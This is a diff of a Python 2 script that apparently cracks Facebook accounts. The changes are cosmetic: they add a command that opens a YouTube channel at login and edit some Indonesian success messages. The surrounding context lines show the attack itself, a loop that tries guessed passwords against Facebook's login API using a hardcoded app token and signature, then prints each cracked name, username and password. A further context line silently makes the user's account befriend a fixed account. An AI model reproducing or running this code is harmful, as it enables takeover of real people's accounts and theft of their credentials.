@@ -108,6 +108,7 @@ def login():
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin Sukses Bossku'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 time.sleep(1)
+		os.system('xdg-open https://youtube.com/YoonaGaming')
                 menu()
             except requests.exceptions.ConnectionError:
                 print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
@@ -200,7 +201,7 @@ def pilih():
                         else:
                             if zedd == '6':
                                 os.system('rm -rf login.txt')
-				os.system('xdg-open https://m.facebook.com/RizalTzansa')
+				os.system('xdg-open https://youtube.com/YoonaGaming')
                                 keluar()
                             else:
                                 if zedd == '0':
@@ -387,7 +388,7 @@ def mini():
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     y = json.load(data)
                     if 'access_token' in y:
-                        print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK.'
+                        print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK, EZ PZ.'
                         print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama FB\x1b[1;97m     : ' + a['name']
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama Pengguna\x1b[1;97m : ' + id
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mKata Sandi\x1b[1;97m : ' + pz2
@@ -407,7 +408,7 @@ def mini():
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             y = json.load(data)
                             if 'access_token' in y:
-                                print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK.'
+                                print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK, EZ PZ.'
                                 print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                 print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama Pengguna\x1b[1;97m : ' + id
                                 print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mKata Sandi\x1b[1;97m : ' + pz3
@@ -428,7 +429,7 @@ def mini():
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     y = json.load(data)
                                     if 'access_token' in y:
-                                        print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK.'
+                                        print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK, EZ PZ.'
                                         print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
@@ -612,7 +613,7 @@ def pilih_super():
                 try:
                     r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                     asw = json.loads(r.text)
-                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
+                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama Grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                 except KeyError:
                     print '\x1b[1;91m[!] Join Grupnya dulu bro agar bisa'
                     raw_input('\n\x1b[1;91m[ \x1b[1;97mOkay \x1b[1;91m]')
